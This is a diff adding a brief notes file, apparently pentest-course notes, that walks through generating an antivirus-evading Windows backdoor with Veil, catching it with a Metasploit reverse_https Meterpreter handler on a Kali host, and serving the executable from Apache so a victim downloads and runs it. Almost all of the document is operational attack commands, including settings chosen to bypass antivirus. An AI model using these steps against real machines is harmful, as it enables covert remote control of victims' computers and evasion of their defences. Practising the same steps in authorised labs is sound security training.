@@ -1,0 +1,52 @@
+Go to Veil folder
+
+./Veil.py
+
+- list
+
+- use 1
+
+- list
+
+- use 15
+
+- set LHOST kali_IP
+
+- set LPORT 8080 (because I have a website used 80 port)
+
+# To bypass all antivirus set the below options:
+
+- set PROCESSORS 1
+
+- set SLEEP 6
+
+- options
+
+- generate
+
+- rev_https_8080 (name of backdoor)
+
+- msfconsole
+
+- use exploit/multi/handler
+
+- show options
+
+- set payload windows/meterpreter/reverse_https
+
+- set LPORT 8080
+
+- set kali_IP
+
+- exploit
+# now we are waiting anybody to click on the backdoor, so we have to transfer the backdoor on the target machine.
+
+# we will upload the backdoor to our kali which is acting as a web server
+
+# go to /var/www/html/evil/ - then copy the backdoor to the folder (/var/lib/veil-evasion/output/complied)
+
+# service apache2 start
+
+# go to windows machine - http://kali_IP/evil
+
+# run the exe file
